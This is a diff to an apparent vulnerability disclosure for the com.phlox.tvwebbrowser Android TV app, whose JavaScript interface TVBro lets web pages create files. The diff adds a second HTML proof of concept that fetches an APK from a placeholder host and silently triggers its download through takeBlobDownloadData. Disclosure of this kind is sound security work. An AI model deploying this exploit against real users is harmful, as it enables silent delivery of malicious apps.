@@ -40,7 +40,7 @@ The `com.phlox.tvwebbrowser` application exposes a JavaScript interface, TVBro, 
 - **Resource Exhaustion**: Creating extremely large files using `takeBlobDownloadData` method.
 - **Arbitrary File Creation/Downloads**: The most critical vulnerability. Files with any content can be created and downloaded without user consent, just by encoding malicious data in Base64.
 
-**Proof of Concept**:
+**Proof of Concepts**:
 
 ```html
 <!-- Simple HTML code to demonstrate vulnerability -->
@@ -78,5 +78,42 @@ The `com.phlox.tvwebbrowser` application exposes a JavaScript interface, TVBro, 
 </html>
 ```
 
+```html
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exploit PoC</title>
+</head>
+
+<body>
+
+<script>
+    // Upon page load, check if the TVBro interface is available and trigger download.
+    window.onload = function() {
+        const apkURL = 'https://yourdomain.com/path/to/yourfile.apk';
+        const mimeType = 'application/vnd.android.package-archive';
+
+        if (window.TVBro && typeof window.TVBro.takeBlobDownloadData === 'function') {
+            // Fetch the APK file as a blob
+            fetch(apkURL).then(response => response.blob()).then(blob => {
+                const reader = new FileReader();
+                reader.readAsDataURL(blob);
+                reader.onloadend = function() {
+                    const base64data = reader.result.split(',')[1];
+                    window.TVBro.takeBlobDownloadData(base64data, 'yourfile.apk', apkURL, mimeType);
+                }
+            });
+        }
+    }
+</script>
+
+</body>
+
+</html>
+
+```
 ---
 
